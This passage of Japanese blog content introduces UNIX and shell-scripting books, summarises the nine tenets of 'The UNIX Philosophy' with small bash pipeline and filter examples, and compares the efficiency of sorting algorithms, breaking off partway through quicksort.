そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-08T10:13:27+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-08-01-tac-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-08-01-tac-suzuki/","title":"【tac】bash/シェルスクリプトマニアックコマンドあれこれ１"},{"content":"名著紹介 これほどまでシンプルに「UNIX/Linuxとは」について書かれた本はない。\n「エンジニアとしての信念はUNIXである」とはどういうことなのか。「プログラマとしてのコンセプトはLinuxなのだ」とはどういうことなのか。\nそうした、少し偏屈なエンジニアに読んでもらいたい。また、UNIX/Linuxに興味を持っている若者の手にとってもらいたい。\n安心してほしい。旅のしおり程度の大きさで厚さは文庫本の半分にも満たない。しかしその中身は、多くのエンジニアを下支えしてきたUNIXという骨について、わかりやすく、かんたんに、そして記憶に残るかずかずの珠玉の言葉を添えしっかりと書かれている。\n稚拙ではあるが、ざっくりと要点も付け加えたので興味を持ってもらえたなら、ネット通販などでお買い求めいただきたい。\nエンジニアには必須の名著一冊、ここに紹介する。\nUNIXという考え方 「UNIXという考え方」\n著者 Mike Gancarz 著、芳尾 桂 監訳\n定価 1,760円 （本体1,600円＋税）\n判型 A5\n頁 168頁\nISBN 978-4-274-06406-7\n発売日 2001/02/24\n発行元 オーム社\nUNIX的なものの考え方とは何か？ UNIXをUNIXらしく使いこなしたい、UNIXらしいプログラムを作りたい人のための一冊です。\nOSの背後にある哲学を、9つの定理と平易な言葉で説く\nOSを使いこなすためには、その背後にある「哲学」を理解することが必要です。本書では技術的詳細には立ち入らず、その代わりに、今まで文章で表されることが少なかったUNIXの考え方を、9つの「定理」にまとめて平易な言葉で明らかにしています。\n定理1：スモール・イズ・ビューティフル\n定理2：一つのプログラムには一つのことをうまくやらせる\n定理3：できるだけ早く試作を作成する\n定理4：効率より移植性\n定理5：数値データはASCIIフラットファイルに保存する\n定理6：ソフトウェアの挺子を有効に活用する\n定理7：シェルスクリプトを使うことで挺子の効果と移植性を高める\n定理8：過度の対話的インタフェースを避ける\n定理9：すべてのプログラムをフィルタにする\nこのような方におすすめ UNIX系OSのユーザ、プログラマ。UNIXの世界観に興味のある人\n主要目次 イントロダクション\n第1章　UNIXの考え方：たくさんの登場人物たち\n第2章　人類にとっての小さな一歩\n第3章　楽しみと実益をかねた早めの試作\n第4章　移植性の優先順位\n第5章　これこそ挺子の効果!\n第6章　対話的プログラムの危険性\n第7章　さらなる10の小定理\n第8章　一つのことをうまくやろう\n第9章　UNIXと他のオペレーティングシステムの考え方\n詳細目次 第1章　UNIXの考え方：たくさんの登場人物たち\n1.1 UNIXの考え方：簡単なまとめ\n第2章　人類にとっての小さな一歩\n2.1 定理1：スモール・イズ・ビューティフル\n2.2 やさしいソフトウェア工学\n2.3 定理2：一つのプログラムには一つのことをうまくやらせる\n第3章　楽しみと実益をかねた早めの試作\n3.1 定理3：できるだけ早く試作を作成する\n3.2 人間による三つのシステム\n3.3 人間による第一のシステム\n3.4 人間による第二のシステム\n3.5 人間による第三のシステム\n3.6 第三のシステムの構築\n第4章　移植性の優先順位\n4.1 定理4：効率より移植性\n4.2 事例研究——Atari 2600\n4.3 定理5：数値データはASCIIフラットファイルに保存する\n4.4 事例研究——あるUNIXプログラマの道具袋\n第5章　これこそ挺子の効果!\n5.1 定理6：ソフトウェアの梃子を有効に活用する\n5.2 定理7：シェルスクリプトを使うことで梃子の効果と移植性を高める\n第6章　対話的プログラムの危険性\n6.1 定理8：過度の対話的インタフェースを避ける\n6.2 定理9：すべてのプログラムをフィルタにする\n6.3 UNIX環境：プログラムをフィルタとして使う\n第7章　さらなる10の小定理\n7.1 (1) 好みに応じて自分で環境を調整できるようにする\n7.2 (2) オペレーティングシステムのカーネルを小さく軽くする\n7.3 (3) 小文字を使い、短く\n7.4 (4) 木を守る\n7.5 (5) 沈黙は金\n7.6 (6) 並行して考える\n7.7 (7) 部分の総和は全体よりも大きい\n7.8 (8) 90パーセントの解を目指す\n7.9 (9) 劣るほうが優れている\n7.10 (10) 階層的に考える\n第8章　一つのことをうまくやろう\n8.1 UNIXの考え方：総括\n第9章　UNIXと他のオペレーティングシステムの考え方\n9.1 Atariホームコンピュータ——芸術としての人間工学\n9.2 MS-DOS——7000万人以上のユーザが間違っているはずがない\n9.3 OpenVMS——UNIXへのアンチテーゼ？\nざっくりななめよみ、鈴木めも 小さいものは美しい　「スモールイズビューティフル」 小さなプログラムはわかりやすい\n小さなプログラムは保守しやすい\n小さなプログラムはシステムリソースに易しい\n小さなプログラムは他のツールと組み合わせやすい\n「伝統的なプログラマは、巨大なアメリカンプログラムによって、\n世界中の全ての問題を一つのプログラムで解決しようとする。」\n「プログラムの９０％はクズである。\nただしあらゆるものの９０％はクズである。」\nパラメータが一行に収まらない\nメソッドが画面に収まらない\nコメントを読まないと何をやっているのか思い出せない\nlsでモジュール名が多すぎて画面の端から消えていってしまう\nまだ開発中なのにエラーメッセージの意味を思い出せない\n整理するためにソースコードを印刷している自分に気がついた\n一つのプログラムには一つの事をうまくやらせる　「わかることは分けること」 「UNIXユーザーは、自分が何をしているのかをわかっている。\n何をしているのかわからないのなら、ここにいるべきではない」\n「一つの事をうまくやるようにプログラムを作れないのであれば、\nおそらく問題をまだ完全に理解していない。」\na)ユーザーとの対話が必要か。パラメータではだめか\nb)入力データは特殊フォーマットが必要か。フォーマット変換プログラムがすでにシステム上にないか。\nc)出力データは特殊フォーマットが必要か。通常のASCIIファイルではだめか。\nd)新しいプログラムを書かずとも似たような機能を持つ他のプログラムがあるのではないか。\n「一つの事をうまくやるようにプログラムを作れないのであれば、\nおそらく問題をまだ完全に理解していない。」\n「しのびよる多機能主義。\nプログラマはいつだってプログラムを遅くする方法を見つける。」\n一つの事をうまくやるようにアプリケーションを書けば、それは必然的に小さなプログラムになる。\n小さなプログラムは単一機能になる傾向があり、単一機能のプログラムは小さくなる傾向がある。\n出来るだけ早く試作する　「反復と協調」 「試作によって学ぶ。早い試作はリスクを減らす。\n「正しく」やっている時間などない」\n「「なにができるか」\nむしろ重要な事は、「なにができないか」を知る事だ。」\n三つのシステム\n１．第一のシステム\n第一のシステムは正しくやっている時間などない。\n第一のシステムは追い詰められた人間が作る。\n第一のシステムのコンセプトは人々の想像力を刺激する。\n第一のシステムは一人かせいぜい数人からなる小さなグループで作られる。\n第一のシステムは高い情熱によって推進され開発は急速に進む。\n第一のシステムは実に性能がよい。\n２．第二のシステム\n第二のシステムは第一のシステムで証明されたアイデアを継承する。\n第二のシステムは委員会が設計する。\n第二のシステムは委員会によりものごとを全て公開の場で自分自身の正当化のために議論を進める。\n第二のシステムは第一のシステムの成功に便乗し分け前にあずかろうとする自称専門家で作られる。\n第二のシステムは自称専門家によりリポジトリ、進捗管理ツールが導入され計画は遅延する。\n第二のシステムは自称専門家のプログラムにおきかえられ贅肉がつき象のようにゆっくり動く。\n第二のシステムは「最初の設計のひどい欠点を見違えるように改善」され多機能となり無知が使う。\n第二のシステムは三つのシステムの中で最悪のシステムである。\n３．第三のシステム\n第三のシステムはこれまでのシステムへの反抗から生まれる。\n第三のシステムの名前が変わり、オリジナルのアイデアはもはや常識となる。\n第三のシステムは第一と第二のシステムの最良の特徴を組み合わせる。\n第三のシステムは設計者にとってようやく「正しく」やる事が出来る。\n第三のシステムはユーザーが実際に使用する機能しか含まれない。\n第三のシステムはディスク、メモリ、CPUサイクルなど最適なバランスが実現されている。\n第三のシステムは提供される性能レベルも良くバランスがとれている。\n第一のシステムとして「試作」を１ナノ秒でも早く作り、\n第一のシステムと第二のシステムのサイクルを反復と協調し、\n第三のシステムに向かって協力しながら進んでいく。\n効率より移植性　bashとawkとsed 「最も効率の良い方法は、\nほとんどの場合「移植性」に欠ける。」\n「移植か死か。優れたソフトウェアは移植され成長し、\nそれ以外は取り残され捨てられる。」\nUNIXにおいてそれはシェルスクリプトしかない。\n次のハードウェアはもっと速く走る。だからプログラムを速くするという誘惑に負けない。\nわずかな速度を求めてCで書き直さない。それは時間の無駄だ。\nシェルスクリプトをあれこれいじる余裕が一瞬でも生じればほとんどのプログラマは\na) 新しい機能をいくつか付け加えようとする\nb) スクリプトそのものを洗練し、実行速度を高めようとする\nc) その一部、または大部分をCで書き直してパフォーマンスの向上を図ろうとする。\n「最も効率の良い方法は、\nほとんどの場合「移植性」に欠ける。」\n「移植か死か。優れたソフトウェアは移植され成長し、\nそれ以外は取り残され捨てられる。」\nDQ1カートリッジ(64kb)用のコード\n自分のプログラマ人生で最も効率の良い、そして移植の難しいコード」を書いた。\n命令をデータとして扱い、データを命令として扱った。\n走査線が画面の右端から左端に引き返すまでの間を狙って命令を実行した。\nメモリ節約のためありとあらゆる技を駆使した。\nこうしてできあがったコードは芸術品と言えるほど見事なものだった。\nフォルクスワーゲンのビートルに２０人ほど詰め込むようなものだった。\nそして保守担当者にとっては究極の悪夢でもあった。\n出力結果はASCIIフラットファイルに保存する　中間ファイルは作らない　RDBは使わない 「動かせないデータは死んだデータだ。」\n出力結果はASCIIフラットファイルに保存する。\n安易と稚拙な知識でRDBを使わない。\nむやみに中間ファイルをはき出さない。\n素晴らしいシステムは中間ファイルI/Oがゼロで、\n全てがメモリ上で稼働する。よってそこそこ高速に動く。\nソフトウェアを梃子として使う　「良いプログラマはよいコードを書く。\n偉大なプログラマは良いコードを借りてくる。」\n梃子の支点をいかに自分のほうに近づける事が出来るか\n独自技術症候群を避け、すでにあるものにクリエイティブな付加価値をつける\n独自技術症候群は創造性を伸ばさない。\n「良いプログラマはよいコードを書く。\n偉大なプログラマは良いコードを借りてくる。」\nシェルスクリプトによって梃子の効果と移植性を高める　パイプ 「私は人生で二度しか奇跡を見た事がない。\n一つは核融合、もう一つは複利だ\n少量のものを繰り返し掛け合わせていく事で、\nやがて奇跡的な規模に達する。」\nシェルスクリプトには恐ろしいほどの梃子（てこ）の効果がある\nシェルスクリプトは梃子の降下で時間も節約する\nシェルスクリプトはCより移植性が高い\n「熟練プログラマはシェルスクリプトを熱心に使う。\nあなたもまたそうするべきだ。」\n「UNIXの源流は高水準の抽象化モデル「シェルスクリプト」であり、\nそれは今も普遍である。」\n「私は人生で二度しか奇跡を見た事がない。\n一つは核融合、もう一つは複利だ\n少量のものを繰り返し掛け合わせていく事で、\nやがて奇跡的な規模に達する。」アインシュタイン\nシェルスクリプト一行はおよそ１万倍の複利を生む\necho who | awk \u0026#39;{ print $1 ; }\u0026#39; | sort | uniq | sed -e \u0026#34;s/ /, /g\u0026#34; ; echo 177 who 755 awk 3411 sort 2614 uniq 302 sed 2093 --------------------- 9.353 処理をパイプでつなぎ処理全体を一行で完結させる。\n「ひとつのことをうまくやる」の良い事例だ。\nfunction sh_func_getTitle() { TITLE=$(echo ${URLGETOPT} | \\ while read line ;do if echo \u0026#34;$line\u0026#34; | grep -i \u0026#34;title=\u0026#34; \u0026gt; /dev/null; then echo \u0026#34;$line\u0026#34; | \\ sed -e \u0026#34;s/^.*title=\\x27//g\u0026#34; \\ -e \u0026#34;s/\\x27.*$//g\u0026#34; \\ -e \u0026#34;s/\\r//g\u0026#34; \\ -e \u0026#34;s/\u0026lt;[^\u0026gt;]*\u0026gt;//g\u0026#34; \\ -e \u0026#34;s/^[●○■□△▽]//g\u0026#34;; fi done ); } 全てのプログラムをフィルタとして設計する メソッド間の入力をstdin、出力はstdoutを使用する\nオンメモリでコマンドフィルタとして稼働する。\nfunction trim(){ if [ -p /dev/stdin ]; then cat - ; else echo -n ; fi | sed -e \u0026#39;s/^ *//g\u0026#39; -e \u0026#39;s/ *$//g\u0026#39; } 実行結果\necho \u0026#34; ほげ \u0026#34; | trim ; ほげ 以下でも良い。\nfunction trim(){ awk \u0026#39;{ print $1; }\u0026#39; | sed -e \u0026#39;s/^ *//g\u0026#39; -e \u0026#39;s/ *$//g\u0026#39; \u0026lt;/dev/stdin } 実行結果\necho \u0026#34; ほげ \u0026#34; | trim ; ほげ 並行して考える 並列処理が可能なメソッドを積極的に書く\n並列処理が可能なメソッドを積極的に書く\nメソッドの並列処理\n#!/bin/bash ## # # function cmd(){ echo \u0026#34;Hello, $1!\u0026#34;; } ## # # function sh_xargs(){ export -f cmd yes | head -1000 | xargs -n1 -P4 -I % bash -c \u0026#34;cmd %\u0026#34; } ## # # sh_xargs ; 木を守る UNIXはドキュメントを忌み嫌う\nUNIXユーザーは紙のドキュメントを忌み嫌う。不要なドキュメントを印刷して整理する事はしない。\nソースコードが実体であり、高水準のドキュメントとなるようプログラムする。\n「ざっくり」シリーズのご紹介 【アルゴリズム ソート比較】ざっくりわかるシェルスクリプト２０\nhttps://suzukiiichiro.github.io/2022-11-02-01-sortcomp-suzuki/\n【アルゴリズム クイックソート】ざっくりわかるシェルスクリプト１９\nhttps://suzukiiichiro.github.io/2022-11-01-01-quicksort-suzuki/\n【アルゴリズム シェルソート】ざっくりわかるシェルスクリプト１８\nhttps://suzukiiichiro.github.io/2022-10-27-01-shellsort-suzuki/\n【アルゴリズム マージソート】ざっくりわかるシェルスクリプト１７\nhttps://suzukiiichiro.github.io/2022-10-19-01-mergesort-suzuki/\n【アルゴリズム 連結リスト】ざっくりわかるシェルスクリプト１６\nhttps://suzukiiichiro.github.io/posts/2022-10-18-01-list-suzuki/\n【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-07T10:30:44+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-07-01-theideaofunix-suzuki/unix_hu4e5174d037459d3bbd04c2e8b28ddd68_342837_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-07-01-theideaofunix-suzuki/","title":"【名著紹介】「ＵＮＩＸという考え方」ご紹介"},{"content":"ソート これまで、バブルソート、選択ソート、挿入ソート、マージソート、シェルソート、クイックソートを学習してきました。\n【バブルソート】\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【選択ソート】\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【挿入ソート】\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【マージソート】\nhttps://suzukiiichiro.github.io/2022-10-19-01-mergesort-suzuki/\n【シェルソート】\nhttps://suzukiiichiro.github.io/2022-10-27-01-shellsort-suzuki/\n【クイックソート】\nhttps://suzukiiichiro.github.io/2022-11-01-01-quicksort-suzuki/\nソートの速度比較 ソートまとめ ソートのざっくりまとめ バブルソート バブルソート バブルソートは遅いソートの代名詞のように言われ、最も単純なアルゴリズムです。\n棒が10本の場合\n最初のパスでは9回の比較を行い、次のパスでは8回,\u0026hellip;, そして最後のパスでは比較を1回行います。\nそこで, 10項目の場合の比較回数は:\n9+8+7+6+5+4+3+2+1 = 45\nとなります。\nこれを一般化すると、配列中の項目数がNとすると、 最初のパスではN1回の比較、次はN-2回,\u0026hellip; の比較を行います。\nこのような数列の和を表す公式は:\n(N-1)+(N-2)+(N-3)+・・・・＝N＊（N−1）/２\nNが１０のときの N＊(N−1)/２ は４５です。\nそこで、バブルソートは約 N^2/2 回の比較を行います。\nと、言います（−１は無視します）\n入れ替えは、比較の回数よりも少なく N^2/4 となります。\nバブルソートの効率\n比較 N^2/2\n入れ替え N^2/4\nビッグオー O(N^2)\nビッグオーでは、分母の２や４も無視します。\nバブルソートのビッグオー（効率）は\nO(N^2)となります。 Nの２乗ということです。\n選択ソート 選択ソート 選択ソート (selection sort) は、入れ替え回数がO(N^2)ではなくO(N)になるためバブルソートよりは良好です。\nただし、残念ながら比較回数はやはりO(N^2)です。\nそのため、バブルソート同様、効率はO(N^2)となります。\n選択ソートの効率\n比較 N^2\n入れ替え N\nビッグオー O(N^2)\n挿入ソート 挿入ソート 多くの場合に、初歩的なソートの中では挿入ソートが最良です。\n実行時間 はやはり O(N^2) ですが、バブルソートの約2倍速く、またふつうの状況では選択ソートよ りもいくらか高速です。\nただし、バブルソートや選択ソートよりもやや込み入っています\nが、それほど複雑なアルゴリズムではありません。\nクイックソートのようなより高度なソートの最終段階で、挿入ソートがよく利用されます。\n挿入ソートの効率は、比較は1回です。\n二度目のパスでは、比較は最大で2回です···。\nそして最後のパスでこのアルゴリズムは、何回の比較とコピーを必要とするのでしょうか?\n最初のパスでは比較は最大でN-1回です。\nそこで、最大比較回数の計は:\n1+2+3+\u0026hellip;.+ (N-1)=N＊N(-1)/2\nしかし各回の平均比較回数は、最大回数の半分ですから、上を2で割って:\nN(N-1)/4\nコピーの回数も比較の回数とほぼ同じです。\nただし、コピーは入れ替えに比べるとそれほど時間を要しませんから、ランダムなデータに対してこのアルゴリズムはバブルソートの2倍速く、選択ソートよりも速いといえます。\nいずれにしても、この章のそのほかのソートルーチンと同じく、挿入ソートのランダムなデータに対する実行時間は O(N^2) です。\nデータがすでにソートされていたり、ほとんどソートされているときには、挿入ソートの性能はぐっと良くなります。\nデータが最初から正順なら、selectionSort() の whileループの条件が真になることはなく、したがってそれは外側ループの中の1つの単純な文となり、 N-1回 実行されます。\nその場合はアルゴリズムは O(N) の時間で動きます。\nデータがほとんどソートされているときは、挿入ソートはほとんど O(N) の時間で動きますから、わずかな乱れしかないファイルを整列する方法としては単純かつ効率的です。\nしかし、逆順にソートされているデータに対しては、最大の比較回数と移動回数が実行されてしまい、したがって挿入ソートはバブルソートと同じ遅さになってしまいます。\n挿入ソートの効率\n比較 N^2\n入れ替え N^2\nビッグオー O(N^2)\n※データがわずかな乱れしかない場合は O(N)\nマージソート マージソート マージソートは、これまでのソートの中で、少なくともスピードの点ではずっと効率的です。\nバブルソート、挿入ソート、そして選択ソートが O(N^2) の時間を要するのに対し、マージソ ートは O(N＊log(N)) です。\nしかもマージソートは、実装もかなり容易です。\nそのアルゴリズムは、クイックソートやシェルソートよりも分かりやすいです。\nマージソートの欠点は、ソートする配列と同サイズの配列をもうひとつ必要とすることです。\n元の配列がかろうじてメモリに収まるという大きさだったら、マージソートは使えません。\nしかしメモリに余裕があるときには、マージソートは良い選択です。\nマージソートの効率\nマージソートの実行時間は O(N＊log(N)) です。\nマージソートの効率\n比較 N-1\n入れ替え N＊log(N)\nビッグオー O(N＊log(N))\nシェルソート シェルソート シェルソートの「シェル」は、1959年にこのソート方法を発明したDonald L.Shell の名前です。\n挿入ソートの改良版とはいえ、その独特のアイデアのお蔭で、挿入ソートに比べると格段に高速です。\nシェルソートは、その実装にもよりますが、項目数が数千程度の中規模な配列をソー トするのに適しています。\nクイックソートのような O(N＊log(N) のソートほど 速くはありませんから、非常に大きなファイルを扱うのには向いていません。\nでも、選択ソートや挿入ソートのような O(N^2) のソートに比べるとずっと速く、実装もきわめて容易、そしてプログラムのコードは短くて単純です。\nシェルソートの一般的なケースの実行効率を理論的に分析した人は、これまで一人もいません。\nしかし実験に基づいて、いろんな推測値は出されています。\nクイックソート クイックソート クイックソートは、 1962年にC.A.R. 